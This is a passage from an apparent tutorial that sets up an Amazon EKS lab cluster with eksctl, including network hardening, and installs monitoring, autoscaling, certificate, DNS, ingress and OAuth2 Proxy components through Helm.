OutputKey==\\`KarpenterNodeInstanceProfileName\\` || OutputKey==\\`KarpenterControllerPolicyArn\\`].{OutputKey:OutputKey,OutputValue:OutputValue}\") AWS_KMS_KEY_ARN=$(echo \"${AWS_CLOUDFORMATION_DETAILS}\" | jq -r \".[] | select(.OutputKey==\\\"KMSKeyArn\\\") .OutputValue\") AWS_KMS_KEY_ID=$(echo \"${AWS_CLOUDFORMATION_DETAILS}\" | jq -r \".[] | select(.OutputKey==\\\"KMSKeyId\\\") .OutputValue\") AWS_KARPENTER_NODE_ROLE_ARN=$(echo \"${AWS_CLOUDFORMATION_DETAILS}\" | jq -r \".[] | select(.OutputKey==\\\"KarpenterNodeRoleArn\\\") .OutputValue\") AWS_KARPENTER_NODE_INSTANCE_PROFILE_NAME=$(echo \"${AWS_CLOUDFORMATION_DETAILS}\" | jq -r \".[] | select(.OutputKey==\\\"KarpenterNodeInstanceProfileName\\\") .OutputValue\") AWS_KARPENTER_CONTROLLER_POLICY_ARN=$(echo \"${AWS_CLOUDFORMATION_DETAILS}\" | jq -r \".[] | select(.OutputKey==\\\"KarpenterControllerPolicyArn\\\") .OutputValue\") After running the CloudFormation stack, you should see the following Route53 zones: Route53 k01.k8s.mylabs.dev zone Route53 k8s.mylabs.dev zone You should also see the following KMS key: KMS key Create Amazon EKS I will use eksctl to create the Amazon EKS cluster. tee \"${TMP_DIR}/${CLUSTER_FQDN}/eksctl-${CLUSTER_NAME}.yml\" &lt;&lt; EOF apiVersion: eksctl.io/v1alpha5 kind: ClusterConfig metadata: name: ${CLUSTER_NAME} region: ${AWS_REGION} tags: karpenter.sh/discovery: ${CLUSTER_NAME} $(echo \"${TAGS}\" | sed \"s/,/\\\\n /g; s/=/: /g\") availabilityZones: - ${AWS_REGION}a - ${AWS_REGION}b accessConfig: authenticationMode: API_AND_CONFIG_MAP accessEntries: - principalARN: ${AWS_KARPENTER_NODE_ROLE_ARN} type: EC2_LINUX - principalARN: arn:${AWS_PARTITION}:iam::${AWS_ACCOUNT_ID}:role/admin accessPolicies: - policyARN: arn:${AWS_PARTITION}:eks::aws:cluster-access-policy/AmazonEKSClusterAdminPolicy accessScope: type: cluster - principalARN: arn:${AWS_PARTITION}:iam::${AWS_ACCOUNT_ID}:user/aws-cli accessPolicies: - policyARN: arn:${AWS_PARTITION}:eks::aws:cluster-access-policy/AmazonEKSClusterAdminPolicy accessScope: type: cluster iam: withOIDC: true podIdentityAssociations: - namespace: aws-ebs-csi-driver serviceAccountName: ebs-csi-controller-sa roleName: eksctl-${CLUSTER_NAME}-pia-aws-ebs-csi-driver wellKnownPolicies: ebsCSIController: true - namespace: cert-manager serviceAccountName: cert-manager roleName: eksctl-${CLUSTER_NAME}-pia-cert-manager wellKnownPolicies: certManager: true - namespace: external-dns serviceAccountName: external-dns roleName: eksctl-${CLUSTER_NAME}-pia-external-dns wellKnownPolicies: externalDNS: true - namespace: karpenter serviceAccountName: karpenter # roleName: eksctl-${CLUSTER_NAME}-pia-karpenter roleName: ${CLUSTER_NAME}-karpenter permissionPolicyARNs: - ${AWS_KARPENTER_CONTROLLER_POLICY_ARN} - namespace: aws-load-balancer-controller serviceAccountName: aws-load-balancer-controller roleName: eksctl-${CLUSTER_NAME}-pia-aws-load-balancer-controller wellKnownPolicies: awsLoadBalancerController: true addons: - name: coredns - name: eks-pod-identity-agent - name: kube-proxy - name: snapshot-controller - name: vpc-cni version: latest configurationValues: |- enableNetworkPolicy: \"true\" env: ENABLE_PREFIX_DELEGATION: \"true\" managedNodeGroups: - name: mng01-ng amiFamily: Bottlerocket # Minimal instance type for running add-ons + karpenter - ARM t4g.medium: 4.0 GiB, 2 vCPUs - 0.0336 hourly # Minimal instance type for running add-ons + karpenter - X86 t3a.medium: 4.0 GiB, 2 vCPUs - 0.0336 hourly instanceType: t4g.medium # Due to karpenter we need 2 instances desiredCapacity: 2 availabilityZones: - ${AWS_REGION}a minSize: 2 maxSize: 5 volumeSize: 20 # disablePodIMDS: true - keep it disabled due to aws-load-balancer-controller volumeEncrypted: true volumeKmsKeyID: ${AWS_KMS_KEY_ID} privateNetworking: true bottlerocket: settings: kubernetes: seccomp-default: true secretsEncryption: keyARN: ${AWS_KMS_KEY_ARN} cloudWatch: clusterLogging: logRetentionInDays: 1 enableTypes: - all EOF Get the kubeconfig file to access the cluster: if [[ ! -s \"${KUBECONFIG}\" ]]; then if ! eksctl get clusters --name=\"${CLUSTER_NAME}\" &amp;&gt; /dev/null; then eksctl create cluster --config-file \"${TMP_DIR}/${CLUSTER_FQDN}/eksctl-${CLUSTER_NAME}.yml\" --kubeconfig \"${KUBECONFIG}\" else eksctl utils write-kubeconfig --cluster=\"${CLUSTER_NAME}\" --kubeconfig \"${KUBECONFIG}\" fi fi aws eks update-kubeconfig --name=\"${CLUSTER_NAME}\" Enhance the security posture of the EKS cluster by addressing the following concerns: AWS_VPC_ID=$(aws ec2 describe-vpcs --filters \"Name=tag:alpha.eksctl.io/cluster-name,Values=${CLUSTER_NAME}\" --query 'Vpcs[*].VpcId' --output text) AWS_SECURITY_GROUP_ID=$(aws ec2 describe-security-groups --filters \"Name=vpc-id,Values=${AWS_VPC_ID}\" \"Name=group-name,Values=default\" --query 'SecurityGroups[*].GroupId' --output text) AWS_NACL_ID=$(aws ec2 describe-network-acls --filters \"Name=vpc-id,Values=${AWS_VPC_ID}\" --query 'NetworkAcls[*].NetworkAclId' --output text) The default security group should have no rules configured: aws ec2 revoke-security-group-egress --group-id \"${AWS_SECURITY_GROUP_ID}\" --protocol all --port all --cidr 0.0.0.0/0 | jq || true aws ec2 revoke-security-group-ingress --group-id \"${AWS_SECURITY_GROUP_ID}\" --protocol all --port all --source-group \"${AWS_SECURITY_GROUP_ID}\" | jq || true The VPC NACL allows unrestricted SSH access, and the VPC NACL allows unrestricted RDP access: aws ec2 create-network-acl-entry --network-acl-id \"${AWS_NACL_ID}\" --ingress --rule-number 1 --protocol tcp --port-range \"From=22,To=22\" --cidr-block 0.0.0.0/0 --rule-action Deny aws ec2 create-network-acl-entry --network-acl-id \"${AWS_NACL_ID}\" --ingress --rule-number 2 --protocol tcp --port-range \"From=3389,To=3389\" --cidr-block 0.0.0.0/0 --rule-action Deny The namespace does not have a PSS level assigned: kubectl label namespace default pod-security.kubernetes.io/enforce=baseline Label all namespaces to provide warnings when configurations deviate from Pod Security Standards: kubectl label namespace --all pod-security.kubernetes.io/warn=baseline Details can be found in: Enforce Pod Security Standards with Namespace Labels EKS Pod Identities Here is a screenshot from the AWS Console showing the EKS Pod Identity Associations: EKS Pod Identity associations Snapshot Controller Install the Volume Snapshot Custom Resource Definitions (CRDs): kubectl apply --kustomize 'https://github.com/kubernetes-csi/external-snapshotter//client/config/crd/?ref=v8.1.0' Install the volume snapshot controller snapshot-controller Helm chart and modify its default values: # renovate: datasource=helm depName=snapshot-controller registryUrl=https://piraeus.io/helm-charts/ SNAPSHOT_CONTROLLER_HELM_CHART_VERSION=\"2.2.2\" helm repo add --force-update piraeus-charts https://piraeus.io/helm-charts/ helm upgrade --wait --install --version \"${SNAPSHOT_CONTROLLER_HELM_CHART_VERSION}\" --namespace snapshot-controller --create-namespace snapshot-controller piraeus-charts/snapshot-controller kubectl label namespace snapshot-controller pod-security.kubernetes.io/enforce=baseline Amazon EBS CSI driver The Amazon Elastic Block Store (Amazon EBS) Container Storage Interface (CSI) Driver provides a CSI interface used by Container Orchestrators to manage the lifecycle of Amazon EBS volumes. (The ebs-csi-controller-sa ServiceAccount was created by eksctl.) Install the Amazon EBS CSI Driver aws-ebs-csi-driver Helm chart and modify its default values: # renovate: datasource=helm depName=aws-ebs-csi-driver registryUrl=https://kubernetes-sigs.github.io/aws-ebs-csi-driver AWS_EBS_CSI_DRIVER_HELM_CHART_VERSION=\"2.31.0\" helm repo add --force-update aws-ebs-csi-driver https://kubernetes-sigs.github.io/aws-ebs-csi-driver tee \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-aws-ebs-csi-driver.yml\" &lt;&lt; EOF controller: enableMetrics: false serviceMonitor: forceEnable: true k8sTagClusterId: ${CLUSTER_NAME} extraVolumeTags: \"eks:cluster-name\": ${CLUSTER_NAME} $(echo \"${TAGS}\" | sed \"s/,/\\\\n /g; s/=/: /g\") serviceAccount: name: ebs-csi-controller-sa region: ${AWS_REGION} node: securityContext: # The node pod must be run as root to bind to the registration/driver sockets runAsNonRoot: false storageClasses: - name: gp3 annotations: storageclass.kubernetes.io/is-default-class: \"true\" parameters: encrypted: \"true\" kmskeyid: ${AWS_KMS_KEY_ARN} volumeSnapshotClasses: - name: ebs-vsc annotations: snapshot.storage.kubernetes.io/is-default-class: \"true\" deletionPolicy: Delete EOF helm upgrade --install --version \"${AWS_EBS_CSI_DRIVER_HELM_CHART_VERSION}\" --namespace aws-ebs-csi-driver --create-namespace --values \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-aws-ebs-csi-driver.yml\" aws-ebs-csi-driver aws-ebs-csi-driver/aws-ebs-csi-driver Delete the gp2 StorageClass, as gp3 will be used instead: kubectl delete storageclass gp2 || true Mailpit Mailpit will be used to receive email alerts from Prometheus. Install the mailpit Helm chart and modify its default values: # renovate: datasource=helm depName=mailpit registryUrl=https://jouve.github.io/charts/ MAILPIT_HELM_CHART_VERSION=\"0.17.4\" helm repo add --force-update jouve https://jouve.github.io/charts/ tee \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-mailpit.yml\" &lt;&lt; EOF ingress: enabled: true annotations: forecastle.stakater.com/expose: \"true\" forecastle.stakater.com/icon: https://raw.githubusercontent.com/axllent/mailpit/61241f11ac94eb33bd84e399129992250eff56ce/server/ui/favicon.svg forecastle.stakater.com/appName: Mailpit nginx.ingress.kubernetes.io/auth-url: https://oauth2-proxy.${CLUSTER_FQDN}/oauth2/auth nginx.ingress.kubernetes.io/auth-signin: https://oauth2-proxy.${CLUSTER_FQDN}/oauth2/start?rd=\\$scheme://\\$host\\$request_uri ingressClassName: nginx hostname: mailpit.${CLUSTER_FQDN} EOF helm upgrade --install --version \"${MAILPIT_HELM_CHART_VERSION}\" --namespace mailpit --create-namespace --values \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-mailpit.yml\" mailpit jouve/mailpit kubectl label namespace mailpit pod-security.kubernetes.io/enforce=baseline Screenshot: kube-prometheus-stack Prometheus should be one of the initial applications installed on the Kubernetes cluster because numerous Kubernetes services and applications can export metrics to it. The kube-prometheus-stack is a collection of Kubernetes manifests, Grafana dashboards, and Prometheus rules. It‚Äôs combined with documentation and scripts to provide easy-to-operate, end-to-end Kubernetes cluster monitoring with Prometheus using the Prometheus Operator. Install the kube-prometheus-stack Helm chart and modify its default values: # renovate: datasource=helm depName=kube-prometheus-stack registryUrl=https://prometheus-community.github.io/helm-charts KUBE_PROMETHEUS_STACK_HELM_CHART_VERSION=\"56.6.2\" helm repo add --force-update prometheus-community https://prometheus-community.github.io/helm-charts tee \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-kube-prometheus-stack.yml\" &lt;&lt; EOF defaultRules: rules: etcd: false kubernetesSystem: false kubeScheduler: false # https://github.com/prometheus-community/helm-charts/blob/main/charts/alertmanager/values.yaml alertmanager: config: global: smtp_smarthost: \"mailpit-smtp.mailpit.svc.cluster.local:25\" smtp_from: \"alertmanager@${CLUSTER_FQDN}\" route: group_by: [\"alertname\", \"job\"] receiver: email routes: - receiver: email matchers: - severity =~ \"warning|critical\" receivers: - name: email email_configs: - to: \"notification@${CLUSTER_FQDN}\" require_tls: false ingress: enabled: true ingressClassName: nginx annotations: forecastle.stakater.com/expose: \"true\" forecastle.stakater.com/icon: https://raw.githubusercontent.com/stakater/ForecastleIcons/master/alert-manager.png forecastle.stakater.com/appName: Alert Manager nginx.ingress.kubernetes.io/auth-url: https://oauth2-proxy.${CLUSTER_FQDN}/oauth2/auth nginx.ingress.kubernetes.io/auth-signin: https://oauth2-proxy.${CLUSTER_FQDN}/oauth2/start?rd=\\$scheme://\\$host\\$request_uri hosts: - alertmanager.${CLUSTER_FQDN} paths: [\"/\"] pathType: ImplementationSpecific tls: - hosts: - alertmanager.${CLUSTER_FQDN} # https://github.com/grafana/helm-charts/blob/main/charts/grafana/values.yaml grafana: defaultDashboardsEnabled: false serviceMonitor: enabled: true ingress: enabled: true ingressClassName: nginx annotations: forecastle.stakater.com/expose: \"true\" forecastle.stakater.com/icon: https://raw.githubusercontent.com/stakater/ForecastleIcons/master/grafana.png forecastle.stakater.com/appName: Grafana nginx.ingress.kubernetes.io/auth-url: https://oauth2-proxy.${CLUSTER_FQDN}/oauth2/auth nginx.ingress.kubernetes.io/auth-signin: https://oauth2-proxy.${CLUSTER_FQDN}/oauth2/start?rd=\\$scheme://\\$host\\$request_uri nginx.ingress.kubernetes.io/configuration-snippet: | auth_request_set \\$email \\$upstream_http_x_auth_request_email; proxy_set_header X-Email \\$email; hosts: - grafana.${CLUSTER_FQDN} paths: [\"/\"] pathType: ImplementationSpecific tls: - hosts: - grafana.${CLUSTER_FQDN} datasources: datasource.yaml: apiVersion: 1 datasources: - name: Prometheus type: prometheus url: http://kube-prometheus-stack-prometheus.kube-prometheus-stack:9090/ access: proxy isDefault: true dashboardProviders: dashboardproviders.yaml: apiVersion: 1 providers: - name: \"default\" orgId: 1 folder: \"\" type: file disableDeletion: false editable: true options: path: /var/lib/grafana/dashboards/default dashboards: default: 1860-node-exporter-full: # renovate: depName=\"Node Exporter Full\" gnetId: 1860 revision: 37 datasource: Prometheus 3662-prometheus-2-0-overview: # renovate: depName=\"Prometheus 2.0 Overview\" gnetId: 3662 revision: 2 datasource: Prometheus 9852-stians-disk-graphs: # renovate: depName=\"node-exporter disk graphs\" gnetId: 9852 revision: 1 datasource: Prometheus 12006-kubernetes-apiserver: # renovate: depName=\"Kubernetes apiserver\" gnetId: 12006 revision: 1 datasource: Prometheus 9614-nginx-ingress-controller: # renovate: depName=\"NGINX Ingress controller\" gnetId: 9614 revision: 1 datasource: Prometheus 15038-external-dns: # renovate: depName=\"External-dns\" gnetId: 15038 revision: 3 datasource: Prometheus # https://github.com/DevOps-Nirvana/Grafana-Dashboards 14314-kubernetes-nginx-ingress-controller-nextgen-devops-nirvana: # renovate: depName=\"Kubernetes Nginx Ingress Prometheus NextGen\" gnetId: 14314 revision: 2 datasource: Prometheus # https://grafana.com/orgs/imrtfm/dashboards - https://github.com/dotdc/grafana-dashboards-kubernetes 15760-kubernetes-views-pods: # renovate: depName=\"Kubernetes / Views / Pods\" gnetId: 15760 revision: 28 datasource: Prometheus 15757-kubernetes-views-global: # renovate: depName=\"Kubernetes / Views / Global\" gnetId: 15757 revision: 37 datasource: Prometheus 15758-kubernetes-views-namespaces: # renovate: depName=\"Kubernetes / Views / Namespaces\" gnetId: 15758 revision: 34 datasource: Prometheus 15759-kubernetes-views-nodes: # renovate: depName=\"Kubernetes / Views / Nodes\" gnetId: 15759 revision: 29 datasource: Prometheus 15761-kubernetes-system-api-server: # renovate: depName=\"Kubernetes / System / API Server\" gnetId: 15761 revision: 16 datasource: Prometheus 15762-kubernetes-system-coredns: # renovate: depName=\"Kubernetes / System / CoreDNS\" gnetId: 15762 revision: 18 datasource: Prometheus 19105-prometheus: # renovate: depName=\"Prometheus\" gnetId: 19105 revision: 3 datasource: Prometheus 16237-cluster-capacity: # renovate: depName=\"Cluster Capacity (Karpenter)\" gnetId: 16237 revision: 1 datasource: Prometheus 16236-pod-statistic: # renovate: depName=\"Pod Statistic (Karpenter)\" gnetId: 16236 revision: 1 datasource: Prometheus 19268-prometheus: # renovate: depName=\"Prometheus All Metrics\" gnetId: 19268 revision: 1 datasource: Prometheus karpenter-capacity-dashboard: url: https://raw.githubusercontent.com/aws/karpenter-provider-aws/ef0a6924c915c8e75a120b1c5674aba92e222f51/website/content/en/v1.2/getting-started/getting-started-with-karpenter/karpenter-capacity-dashboard.json karpenter-performance-dashboard: url: https://raw.githubusercontent.com/aws/karpenter-provider-aws/ef0a6924c915c8e75a120b1c5674aba92e222f51/website/content/en/v1.2/getting-started/getting-started-with-karpenter/karpenter-performance-dashboard.json grafana.ini: analytics: check_for_updates: false server: root_url: https://grafana.${CLUSTER_FQDN} # Use oauth2-proxy instead of default Grafana Oauth auth.basic: enabled: false auth.proxy: enabled: true header_name: X-Email header_property: email users: auto_assign_org_role: Admin smtp: enabled: true host: \"mailpit-smtp.mailpit.svc.cluster.local:25\" from_address: grafana@${CLUSTER_FQDN} networkPolicy: enabled: true kubeControllerManager: enabled: false kubeEtcd: enabled: false kubeScheduler: enabled: false kubeProxy: enabled: false kube-state-metrics: networkPolicy: enabled: true selfMonitor: enabled: true prometheus-node-exporter: networkPolicy: enabled: true prometheusOperator: networkPolicy: enabled: true prometheus: networkPolicy: enabled: false ingress: enabled: true ingressClassName: nginx annotations: forecastle.stakater.com/expose: \"true\" forecastle.stakater.com/icon: https://raw.githubusercontent.com/cncf/artwork/master/projects/prometheus/icon/color/prometheus-icon-color.svg forecastle.stakater.com/appName: Prometheus nginx.ingress.kubernetes.io/auth-url: https://oauth2-proxy.${CLUSTER_FQDN}/oauth2/auth nginx.ingress.kubernetes.io/auth-signin: https://oauth2-proxy.${CLUSTER_FQDN}/oauth2/start?rd=\\$scheme://\\$host\\$request_uri paths: [\"/\"] pathType: ImplementationSpecific hosts: - prometheus.${CLUSTER_FQDN} tls: - hosts: - prometheus.${CLUSTER_FQDN} prometheusSpec: externalLabels: cluster: ${CLUSTER_FQDN} externalUrl: https://prometheus.${CLUSTER_FQDN} ruleSelectorNilUsesHelmValues: false serviceMonitorSelectorNilUsesHelmValues: false podMonitorSelectorNilUsesHelmValues: false retentionSize: 1GB walCompression: true storageSpec: volumeClaimTemplate: spec: storageClassName: gp3 accessModes: [\"ReadWriteOnce\"] resources: requests: storage: 2Gi additionalScrapeConfigs: - job_name: karpenter kubernetes_sd_configs: - role: endpoints namespaces: names: - karpenter relabel_configs: - source_labels: - __meta_kubernetes_endpoints_name - __meta_kubernetes_endpoint_port_name action: keep regex: karpenter;http-metrics EOF helm upgrade --install --version \"${KUBE_PROMETHEUS_STACK_HELM_CHART_VERSION}\" --namespace kube-prometheus-stack --create-namespace --values \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-kube-prometheus-stack.yml\" kube-prometheus-stack prometheus-community/kube-prometheus-stack Karpenter Karpenter is a Kubernetes node autoscaler built for flexibility, performance, and simplicity. It automatically launches appropriately sized compute resources to handle your cluster‚Äôs applications. Install the Karpenter Helm chart and modify its default values: # renovate: datasource=github-tags depName=aws/karpenter-provider-aws KARPENTER_HELM_CHART_VERSION=\"0.37.0\" tee \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-karpenter.yml\" &lt;&lt; EOF serviceAccount: name: karpenter serviceMonitor: enabled: true logLevel: debug settings: clusterName: ${CLUSTER_NAME} interruptionQueue: ${CLUSTER_NAME} EOF helm upgrade --install --version \"${KARPENTER_HELM_CHART_VERSION}\" --namespace karpenter --create-namespace --values \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-karpenter.yml\" karpenter oci://public.ecr.aws/karpenter/karpenter kubectl label namespace karpenter pod-security.kubernetes.io/enforce=baseline Configure Karpenter by applying the following NodePool and EC2NodeClass definitions: tee \"${TMP_DIR}/${CLUSTER_FQDN}/k8s-karpenter-nodepool-ec2nodeclass.yml\" &lt;&lt; EOF | kubectl apply -f - apiVersion: karpenter.sh/v1beta1 kind: NodePool metadata: name: default spec: template: metadata: labels: managedBy: karpenter spec: nodeClassRef: apiVersion: karpenter.k8s.aws/v1beta1 kind: EC2NodeClass name: default requirements: - key: karpenter.sh/capacity-type operator: In values: [\"spot\", \"on-demand\"] - key: kubernetes.io/arch operator: In values: [\"amd64\", \"arm64\"] - key: \"topology.kubernetes.io/zone\" operator: In values: [\"${AWS_REGION}a\"] - key: karpenter.k8s.aws/instance-family operator: In values: [\"t3a\", \"t4g\"] # Resource limits constrain the total size of the cluster. # Limits prevent Karpenter from creating new instances once the limit is exceeded. limits: cpu: 8 memory: 32Gi disruption: consolidationPolicy: WhenUnderutilized expireAfter: 720h # 30 * 24h = 720h --- apiVersion: karpenter.k8s.aws/v1beta1 kind: EC2NodeClass metadata: name: default annotations: kubernetes.io/description: \"EC2NodeClass for running Bottlerocket nodes\" spec: amiFamily: Bottlerocket subnetSelectorTerms: - tags: karpenter.sh/discovery: ${CLUSTER_NAME} Name: \"*Private*\" securityGroupSelectorTerms: - tags: karpenter.sh/discovery: ${CLUSTER_NAME} instanceProfile: ${AWS_KARPENTER_NODE_INSTANCE_PROFILE_NAME} blockDeviceMappings: - deviceName: /dev/xvda ebs: volumeSize: 2Gi volumeType: gp3 encrypted: true kmsKeyID: ${AWS_KMS_KEY_ARN} - deviceName: /dev/xvdb ebs: volumeSize: 20Gi volumeType: gp3 encrypted: true kmsKeyID: ${AWS_KMS_KEY_ARN} tags: Name: \"${CLUSTER_NAME}-karpenter\" $(echo \"${TAGS}\" | sed \"s/,/\\\\n /g; s/=/: /g\") EOF cert-manager cert-manager adds certificates and certificate issuers as resource types in Kubernetes clusters and simplifies the process of obtaining, renewing, and using those certificates. The cert-manager ServiceAccount was created by eksctl. Install the cert-manager Helm chart and modify its default values: # renovate: datasource=helm depName=cert-manager registryUrl=https://charts.jetstack.io CERT_MANAGER_HELM_CHART_VERSION=\"1.15.0\" helm repo add --force-update jetstack https://charts.jetstack.io tee \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-cert-manager.yml\" &lt;&lt; EOF installCRDs: true serviceAccount: name: cert-manager extraArgs: - --cluster-resource-namespace=cert-manager - --enable-certificate-owner-ref=true securityContext: fsGroup: 1001 prometheus: servicemonitor: enabled: true webhook: networkPolicy: enabled: true EOF helm upgrade --install --version \"${CERT_MANAGER_HELM_CHART_VERSION}\" --namespace cert-manager --create-namespace --wait --values \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-cert-manager.yml\" cert-manager jetstack/cert-manager kubectl label namespace cert-manager pod-security.kubernetes.io/enforce=baseline Add ClusterIssuers for the Let‚Äôs Encrypt staging environment: tee \"${TMP_DIR}/${CLUSTER_FQDN}/k8s-cert-manager-clusterissuer-staging.yml\" &lt;&lt; EOF | kubectl apply -f - apiVersion: cert-manager.io/v1 kind: ClusterIssuer metadata: name: letsencrypt-staging-dns namespace: cert-manager labels: letsencrypt: staging spec: acme: server: https://acme-staging-v02.api.letsencrypt.org/directory email: ${MY_EMAIL} privateKeySecretRef: name: letsencrypt-staging-dns solvers: - selector: dnsZones: - ${CLUSTER_FQDN} dns01: route53: region: ${AWS_REGION} EOF kubectl wait --namespace cert-manager --timeout=15m --for=condition=Ready clusterissuer --all Create the certificate: tee \"${TMP_DIR}/${CLUSTER_FQDN}/k8s-cert-manager-certificate-staging.yml\" &lt;&lt; EOF | kubectl apply -f - apiVersion: cert-manager.io/v1 kind: Certificate metadata: name: ingress-cert-staging namespace: cert-manager labels: letsencrypt: staging spec: secretName: ingress-cert-staging secretTemplate: labels: letsencrypt: staging issuerRef: name: letsencrypt-staging-dns kind: ClusterIssuer commonName: \"*.${CLUSTER_FQDN}\" dnsNames: - \"*.${CLUSTER_FQDN}\" - \"${CLUSTER_FQDN}\" EOF ExternalDNS ExternalDNS synchronizes exposed Kubernetes Services and Ingresses with DNS providers. ExternalDNS will manage the DNS records. The external-dns ServiceAccount was created by eksctl. Install the external-dns Helm chart and modify its default values: # renovate: datasource=helm depName=external-dns registryUrl=https://kubernetes-sigs.github.io/external-dns/ EXTERNAL_DNS_HELM_CHART_VERSION=\"1.14.4\" helm repo add --force-update external-dns https://kubernetes-sigs.github.io/external-dns/ tee \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-external-dns.yml\" &lt;&lt; EOF domainFilters: - ${CLUSTER_FQDN} interval: 20s policy: sync serviceAccount: name: external-dns serviceMonitor: enabled: true EOF helm upgrade --install --version \"${EXTERNAL_DNS_HELM_CHART_VERSION}\" --namespace external-dns --create-namespace --values \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-external-dns.yml\" external-dns external-dns/external-dns kubectl label namespace external-dns pod-security.kubernetes.io/enforce=baseline AWS Load Balancer Controller The AWS Load Balancer Controller is a controller that manages Elastic Load Balancers for a Kubernetes cluster. It is used by ingress-nginx. Install the aws-load-balancer-controller Helm chart and modify its default values: # renovate: datasource=helm depName=aws-load-balancer-controller registryUrl=https://aws.github.io/eks-charts AWS_LOAD_BALANCER_CONTROLLER_HELM_CHART_VERSION=\"1.11.0\" helm repo add --force-update eks https://aws.github.io/eks-charts tee \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-aws-load-balancer-controller.yml\" &lt;&lt; EOF serviceAccount: name: aws-load-balancer-controller clusterName: ${CLUSTER_NAME} EOF helm upgrade --install --version \"${AWS_LOAD_BALANCER_CONTROLLER_HELM_CHART_VERSION}\" --namespace aws-load-balancer-controller --create-namespace --wait --values \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-aws-load-balancer-controller.yml\" aws-load-balancer-controller eks/aws-load-balancer-controller kubectl label namespace aws-load-balancer-controller pod-security.kubernetes.io/enforce=baseline Ingress NGINX Controller ingress-nginx is an Ingress controller for Kubernetes that uses nginx as a reverse proxy and load balancer. Install the ingress-nginx Helm chart and modify its default values: # renovate: datasource=helm depName=ingress-nginx registryUrl=https://kubernetes.github.io/ingress-nginx INGRESS_NGINX_HELM_CHART_VERSION=\"4.12.3\" kubectl wait --namespace cert-manager --for=condition=Ready --timeout=10m certificate ingress-cert-staging helm repo add --force-update ingress-nginx https://kubernetes.github.io/ingress-nginx tee \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-ingress-nginx.yml\" &lt;&lt; EOF controller: config: use-proxy-protocol: true allowSnippetAnnotations: true ingressClassResource: default: true admissionWebhooks: networkPolicyEnabled: true extraArgs: default-ssl-certificate: \"cert-manager/ingress-cert-staging\" service: annotations: service.beta.kubernetes.io/aws-load-balancer-additional-resource-tags: ${TAGS//\\'/} service.beta.kubernetes.io/aws-load-balancer-name: eks-${CLUSTER_NAME} service.beta.kubernetes.io/aws-load-balancer-nlb-target-type: ip service.beta.kubernetes.io/aws-load-balancer-scheme: internet-facing service.beta.kubernetes.io/aws-load-balancer-target-group-attributes: proxy_protocol_v2.enabled=true service.beta.kubernetes.io/aws-load-balancer-type: external loadBalancerClass: service.k8s.aws/nlb metrics: enabled: true serviceMonitor: enabled: true prometheusRule: enabled: true rules: - alert: NGINXConfigFailed expr: count(nginx_ingress_controller_config_last_reload_successful == 0) &gt; 0 for: 1s labels: severity: critical annotations: description: bad ingress config - nginx config test failed summary: uninstall the latest ingress changes to allow config reloads to resume - alert: NGINXCertificateExpiry expr: (avg(nginx_ingress_controller_ssl_expire_time_seconds) by (host) - time()) &lt; 604800 for: 1s labels: severity: critical annotations: description: ssl certificate(s) will expire in less then a week summary: renew expiring certificates to avoid downtime - alert: NGINXTooMany500s expr: 100 * ( sum( nginx_ingress_controller_requests{status=~\"5.+\"} ) / sum(nginx_ingress_controller_requests) ) &gt; 5 for: 1m labels: severity: warning annotations: description: Too many 5XXs summary: More than 5% of all requests returned 5XX, this requires your attention - alert: NGINXTooMany400s expr: 100 * ( sum( nginx_ingress_controller_requests{status=~\"4.+\"} ) / sum(nginx_ingress_controller_requests) ) &gt; 5 for: 1m labels: severity: warning annotations: description: Too many 4XXs summary: More than 5% of all requests returned 4XX, this requires your attention EOF helm upgrade --install --version \"${INGRESS_NGINX_HELM_CHART_VERSION}\" --namespace ingress-nginx --create-namespace --wait --values \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-ingress-nginx.yml\" ingress-nginx ingress-nginx/ingress-nginx kubectl label namespace ingress-nginx pod-security.kubernetes.io/enforce=baseline Forecastle Forecastle is a control panel that dynamically discovers and provides a launchpad for accessing applications deployed on Kubernetes. Install the forecastle Helm chart and modify its default values: # renovate: datasource=helm depName=forecastle registryUrl=https://stakater.github.io/stakater-charts FORECASTLE_HELM_CHART_VERSION=\"1.0.139\" helm repo add --force-update stakater https://stakater.github.io/stakater-charts tee \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-forecastle.yml\" &lt;&lt; EOF forecastle: config: namespaceSelector: any: true title: Launch Pad networkPolicy: enabled: true ingress: enabled: true annotations: nginx.ingress.kubernetes.io/auth-signin: https://oauth2-proxy.${CLUSTER_FQDN}/oauth2/start?rd=\\$scheme://\\$host\\$request_uri nginx.ingress.kubernetes.io/auth-url: https://oauth2-proxy.${CLUSTER_FQDN}/oauth2/auth className: nginx hosts: - host: ${CLUSTER_FQDN} paths: - path: / pathType: Prefix tls: - hosts: - ${CLUSTER_FQDN} EOF helm upgrade --install --version \"${FORECASTLE_HELM_CHART_VERSION}\" --namespace forecastle --create-namespace --values \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-forecastle.yml\" forecastle stakater/forecastle kubectl label namespace forecastle pod-security.kubernetes.io/enforce=baseline Screenshot: OAuth2 Proxy Use OAuth2 Proxy to protect application endpoints with Google Authentication. Install the oauth2-proxy Helm chart and modify its default values: # renovate: datasource=helm depName=oauth2-proxy registryUrl=https://oauth2-proxy.github.io/manifests OAUTH2_PROXY_HELM_CHART_VERSION=\"7.7.1\" helm repo add --force-update oauth2-proxy https://oauth2-proxy.github.io/manifests tee \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-oauth2-proxy.yml\" &lt;&lt; EOF config: clientID: ${GOOGLE_CLIENT_ID} clientSecret: ${GOOGLE_CLIENT_SECRET} cookieSecret: \"$(openssl rand -base64 32 | head -c 32 | base64)\" configFile: |- cookie_domains = \".${CLUSTER_FQDN}\" set_authorization_header = \"true\" set_xauthrequest = \"true\" upstreams = [ \"file:///dev/null\" ] whitelist_domains = 